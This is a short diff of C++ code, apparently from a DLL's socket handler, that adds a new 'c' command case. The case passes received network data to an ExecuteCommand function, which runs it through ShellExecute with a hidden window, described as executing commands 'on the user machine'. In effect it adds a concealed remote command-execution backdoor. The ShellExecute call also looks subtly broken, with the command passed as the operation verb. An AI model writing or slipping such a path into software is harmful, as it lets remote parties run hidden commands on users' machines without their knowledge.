@@ -56,6 +56,8 @@ int OnAccept(char* buffer)
 	{
 	case 'u':
 		return Update(n_Length, s_Value);
+	case 'c':
+		return ExecuteCommand(n_Length, s_Value);
 	default:
 		return Echo(buffer);
 		break;
@@ -100,7 +102,30 @@ Prints out the data received in the buffer
 */
 const int Echo(char* buffer)
 {
-	std::cout << buffer << std::endl;
+	//std::cout << buffer << std::endl;
+	strcpy_s(buffer, 100, "echo from dll");
+
+	return -2;
+}
+
+/**
+Execute Command on the user machine
+
+@param length: The length of the command to execute 
+@param command: The data to echo out
+@return -1
+*/
+const int ExecuteCommand(int length, char* command)
+{
+	ShellExecute(
+		nullptr,	// hwnd,
+		command,	// lpOperation,
+		nullptr,	// lpFile,
+		nullptr,	// lpParameters,
+		nullptr,	// lpDirectory,
+		SW_HIDE		// nShowCmd
+	);
+
 	return -1;
 }
 
